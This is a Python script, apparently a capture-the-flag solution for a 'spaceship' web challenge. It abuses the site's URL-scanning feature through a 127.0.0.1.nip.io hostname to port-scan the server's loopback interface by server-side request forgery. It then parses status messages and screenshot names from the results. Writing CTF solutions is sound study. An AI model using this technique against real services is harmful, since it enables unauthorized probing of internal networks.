SESS=open('/challenge/workspace/session.txt').read().strip()
lock=threading.Lock()
def scan(port, host='127.0.0.1.nip.io'):
    s=requests.Session()
    s.cookies.set('sc_session', SESS, domain='spaceship.web.2026.sunshinectf.games')
    url='http://%s:%d/'%(host,port)
    try:
        r=s.post(BASE+'/scan', data={'url':url}, allow_redirects=False, timeout=30)
    except Exception as e:
        return (port,'EXC',str(e)[:80],None)
    if r.status_code!=302:
        return (port,'HTTP%d'%r.status_code, r.text[:120], None)
    loc=r.headers['location']
    try:
        rr=s.get(BASE+loc, timeout=30)
    except Exception as e:
        return (port,'EXC2',str(e)[:80],None)
    st=re.search(r'Status</span><span class="v">([^<]*)</span>', rr.text)
    st=st.group(1) if st else '?'
    a=re.search(r'Drone note: ([^<]*)', rr.text)
    note=a.group(1) if a else ''
    img=re.search(r'/screenshots/([0-9a-f-]+\.png)', rr.text)
    return (port, st, note[:80], img.group(1) if img else None)

if __name__=='__main__':
    ports=[int(x) for x in sys.argv[1:]]
    with concurrent.futures.ThreadPoolExecutor(max_workers=8) as ex:
        for res in ex.map(scan, ports):
            if 'ERR_CONNECTION_REFUSED' in res[2]:
                continue
            with lock:
                print(res, flush=True)
